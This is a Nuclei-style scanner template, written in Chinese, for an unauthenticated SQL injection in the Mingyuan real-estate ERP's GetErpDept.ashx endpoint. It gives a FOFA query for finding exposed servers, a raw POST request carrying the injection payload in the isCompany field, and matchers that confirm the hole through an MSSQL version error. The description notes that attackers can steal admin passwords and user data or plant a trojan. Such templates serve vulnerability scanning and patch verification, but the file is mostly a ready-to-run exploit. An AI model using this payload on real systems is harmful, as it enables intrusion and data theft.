id: mingyuandichanERP-GetErpDept_ashx-sql

info:
  tags: mingyuandichanERP-GetErpDept_ashx-sql
  name: 明源地产ERP GetErpDept.ashx SQL注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: body="/_common/scripts/md5-min.js"
    明源地产ERP GetErpDept.ashx 接口存在SQL注入漏洞,未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
http:
  - raw:
      - |
        POST /XmjdUI/Handle/GetErpDept.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        isCompany=') and 1=@@VERSION--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Microsoft SQL Server'
          - '在将 nvarchar 值'
        condition: and
      - type: status
        status: 
          - 200
